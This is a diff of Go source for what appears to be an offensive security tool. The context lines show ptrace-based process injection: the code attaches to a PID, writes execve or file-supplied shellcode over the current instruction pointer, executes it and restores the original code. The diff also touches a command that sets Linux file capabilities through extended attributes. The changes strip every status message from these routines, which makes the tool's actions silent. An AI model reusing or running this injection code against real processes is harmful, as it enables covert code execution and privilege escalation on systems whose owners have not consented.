@@ -102,7 +102,6 @@ If you understand these risks, run again with --force flag.`,
 	commData, _ := ioutil.ReadFile(commPath)
 	processName := strings.TrimSpace(string(commData))
 
-	fmt.Printf("[*] Target process: %s (PID: %d)\n", processName, pid)
 
 	var shellcode []byte
 
@@ -115,7 +114,6 @@ If you understand these risks, run again with --force flag.`,
 		}
 
 		shellcode = c.generateExecveShellcode(command)
-		fmt.Printf("[*] Generated execve shellcode for: %s\n", command)
 	} else {
 		// Read shellcode from file
 		shellcodePath := args[1]
@@ -158,7 +156,6 @@ If you understand these risks, run again with --force flag.`,
 			}
 		}
 		shellcode = data
-		fmt.Printf("[*] Loaded %d bytes of shellcode from file\n", len(shellcode))
 	}
 
 	// Attempt injection with safety checks
@@ -193,7 +190,6 @@ func (c *ProcessInjectionCommand) injectShellcode(pid int, shellcode []byte) err
 	}
 
 	// Attach to process
-	fmt.Printf("[*] Attaching to PID %d...\n", pid)
 	if err := syscall.PtraceAttach(pid); err != nil {
 		if err == syscall.EPERM {
 			return fmt.Errorf("permission denied - check ptrace_scope or run as root")
@@ -207,7 +203,6 @@ func (c *ProcessInjectionCommand) injectShellcode(pid int, shellcode []byte) err
 	attached := true
 	defer func() {
 		if attached {
-			fmt.Printf("[*] Detaching from process...\n")
 			syscall.PtraceDetach(pid)
 		}
 	}()
@@ -230,14 +225,12 @@ func (c *ProcessInjectionCommand) injectShellcode(pid int, shellcode []byte) err
 
 	// Save original registers for restoration
 	originalRegs := regs
-	fmt.Printf("[*] Original RIP: 0x%x\n", originalRegs.Rip)
 
 	// Find a suitable code cave or use current RIP location
 	// For simplicity, we'll backup and use current instruction area
 	injectionAddr := uintptr(regs.Rip)
 
 	// Backup original code
-	fmt.Printf("[*] Backing up original code at 0x%x...\n", injectionAddr)
 	originalCode := make([]byte, len(shellcode))
 
 	for i := 0; i < len(shellcode); i += 8 {
@@ -249,7 +242,6 @@ func (c *ProcessInjectionCommand) injectShellcode(pid int, shellcode []byte) err
 	}
 
 	// Write shellcode
-	fmt.Printf("[*] Writing %d bytes of shellcode...\n", len(shellcode))
 	for i := 0; i < len(shellcode); i += 8 {
 		word := binary.LittleEndian.Uint64(shellcode[i : i+8])
 		_, err := syscall.PtracePokeData(pid, injectionAddr+uintptr(i), []byte{
@@ -282,7 +274,6 @@ func (c *ProcessInjectionCommand) injectShellcode(pid int, shellcode []byte) err
 	}
 
 	// Set RIP to shellcode (it's already there since we overwrote current position)
-	fmt.Printf("[*] Executing shellcode...\n")
 
 	// Single step to execute shellcode
 	if err := syscall.PtraceSingleStep(pid); err != nil {
@@ -307,7 +298,6 @@ func (c *ProcessInjectionCommand) injectShellcode(pid int, shellcode []byte) err
 	time.Sleep(100 * time.Millisecond)
 
 	// Restore original code
-	fmt.Printf("[*] Restoring original code...\n")
 	for i := 0; i < len(originalCode); i += 8 {
 		word := binary.LittleEndian.Uint64(originalCode[i : i+8])
 		_, err := syscall.PtracePokeData(pid, injectionAddr+uintptr(i), []byte{
@@ -321,19 +311,15 @@ func (c *ProcessInjectionCommand) injectShellcode(pid int, shellcode []byte) err
 			byte(word >> 56),
 		})
 		if err != nil {
-			fmt.Printf("[!] Warning: Failed to restore code at offset %d\n", i)
 		}
 	}
 
 	// Restore original registers
 	if err := syscall.PtraceSetRegs(pid, &originalRegs); err != nil {
-		fmt.Printf("[!] Warning: Failed to restore registers: %v\n", err)
 	}
 
 	// Continue execution
-	fmt.Printf("[*] Resuming process execution...\n")
 	if err := syscall.PtraceCont(pid, 0); err != nil {
-		fmt.Printf("[!] Warning: Failed to continue process: %v\n", err)
 	}
 
 	return nil
@@ -769,7 +755,6 @@ If you understand these risks, run again with --confirm flag:
 	}
 
 	// Set the extended attribute
-	fmt.Printf("[*] Setting capability %s on %s...\n", cap, file)
 
 	err = syscall.Setxattr(file, "security.capability", buf.Bytes(), 0)
 	if err != nil {
